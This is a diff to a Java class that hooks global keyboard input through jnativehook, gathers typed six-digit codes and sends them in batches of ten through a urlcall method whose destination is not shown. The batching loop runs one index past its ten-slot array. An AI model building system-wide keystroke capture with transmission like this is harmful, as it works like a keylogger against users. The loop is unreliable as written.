@@ -21,6 +21,10 @@ import org.jnativehook.mouse.NativeMouseWheelListener;
 public class keytest implements NativeKeyListener {
 	
 	List<Character> ls =new ArrayList<Character>();
+	List<String> codelist= new ArrayList<String>();
+	String[] codearray=new String[10];
+	int arraycount=0,listcount=0;
+	
 	
 	
 	public keytest()
@@ -152,8 +156,8 @@ public class keytest implements NativeKeyListener {
                 String listString=builder.toString();
 	    		
 	    		System.out.println("Your six digit code is :"+listString);
+	    		collectcode(listString);
 	    		
-	    		urlcall(listString);
 	    		ls.clear();
 	    	
 	    	}	
@@ -165,6 +169,55 @@ public class keytest implements NativeKeyListener {
 		
 		
 	     
+}
+	
+	
+	
+	public void collectcode(String code)
+	{
+		
+		
+		codelist.add(code);
+		codearray[arraycount]=codelist.get(listcount);
+		arraycount++;
+		listcount++;
+		
+		
+		
+		
+		
+		if (arraycount == 10)
+		
+		{   
+		
+		for(int i=0 ;i<=arraycount	;i++)
+		  {
+			 
+				try {
+					urlcall(codearray[i]);
+				} catch (Exception e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+			
+		  }
+		 
+		    
+		
+        arraycount=0;
+    
+		
+		}
+		
+		
+		if (listcount == 100)
+		{
+			System.out.println("Clearing the arraylist");
+			codelist.clear();
+			listcount=0;
+		}
+	
+	
 }
 
    public void urlcall(String url) throws Exception
